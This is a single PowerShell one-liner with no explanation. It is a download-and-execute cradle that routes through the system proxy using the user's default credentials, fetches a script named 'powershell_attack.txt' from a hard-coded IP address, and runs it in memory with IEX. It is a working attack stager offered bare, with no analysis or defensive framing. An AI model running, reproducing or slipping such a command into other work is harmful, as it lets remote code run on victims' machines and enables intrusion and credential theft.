
$M=new-object net.webclient;$M.proxy=[Net.WebRequest]::GetSystemWebProxy();$M.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $M.downloadstring('http://37.28.154.204/powershell_attack.txt');

